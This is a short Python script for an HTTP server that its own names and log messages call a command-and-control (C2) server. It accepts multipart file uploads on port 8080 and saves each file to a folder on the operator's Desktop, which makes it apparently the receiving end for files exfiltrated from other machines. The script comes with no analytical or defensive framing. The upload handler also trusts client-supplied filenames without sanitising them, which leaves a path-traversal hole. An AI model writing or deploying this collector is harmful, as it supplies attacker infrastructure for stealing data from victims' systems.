import os
from http.server import BaseHTTPRequestHandler, HTTPServer

# Define the directory to store the uploaded files
UPLOAD_DIR = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'uploaded_files')

if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)

class C2ServerHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        content_type = self.headers['Content-Type']

        post_data = self.rfile.read(content_length)

        if "multipart/form-data" in content_type:
            boundary = content_type.split("=")[1].encode()
            parts = post_data.split(b"--" + boundary)

            for part in parts:
                if b"Content-Disposition" in part and b"filename=" in part:
                    headers = part.split(b"\r\n\r\n")[0]
                    body = part.split(b"\r\n\r\n")[1].rsplit(b"\r\n", 1)[0]

                    filename_line = [line for line in headers.split(b"\r\n") if b"filename=" in line][0]
                    filename = filename_line.split(b"filename=")[1].strip(b'"').decode()

                    filepath = os.path.join(UPLOAD_DIR, filename)
                    with open(filepath, 'wb') as f:
                        f.write(body)

                    print(f"[+] File received and saved: {filename}")
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(f"File received: {filename}".encode())
                    return

        self.send_response(400)
        self.end_headers()
        self.wfile.write(b"Invalid upload")

def run(server_class=HTTPServer, handler_class=C2ServerHandler, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"[🛰️] C2 server listening on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
